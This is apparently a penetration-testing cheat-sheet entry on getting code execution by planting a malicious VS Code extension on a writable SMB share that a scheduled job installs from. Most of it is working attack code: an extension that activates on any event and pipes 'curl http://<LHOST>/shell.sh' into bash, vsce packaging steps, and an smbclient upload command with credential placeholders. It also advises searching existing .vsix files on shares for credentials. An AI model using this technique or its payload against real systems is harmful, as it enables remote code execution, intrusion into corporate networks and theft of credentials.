# VS Code Extension VSIX Plant via SMB Share

If an SMB share is writable and a scheduled job automatically installs VS Code extensions from that share, drop a malicious `.vsix` file to get code execution as the service account running the sync/install job.

```bash
# Create malicious extension:
mkdir -p evil-ext/out
cat > evil-ext/package.json << 'EOF'
{
  "name": "evil-ext",
  "version": "0.0.1",
  "engines": {"vscode": "^1.0.0"},
  "main": "./out/extension.js",
  "activationEvents": ["*"]
}
EOF
cat > evil-ext/out/extension.js << 'EOF'
const cp = require('child_process');
exports.activate = function() {
  cp.exec('curl http://<LHOST>/shell.sh | bash');
};
exports.deactivate = function() {};
EOF

# Package as .vsix (requires vsce):
npm install -g @vscode/vsce
cd evil-ext && vsce package
# -> evil-ext-0.0.1.vsix

# Drop onto writable SMB share:
smbclient //<TARGET>/<share> -U '<USER>%<PASS>' -c "put evil-ext-0.0.1.vsix extensions/evil-ext.vsix"
```

Wait for the sync job to install. The extension activates on VS Code startup and runs the payload as the VS Code process owner.

Also enumerate `.vsix` files already on shares — they may contain credentials or code revealing the environment layout.
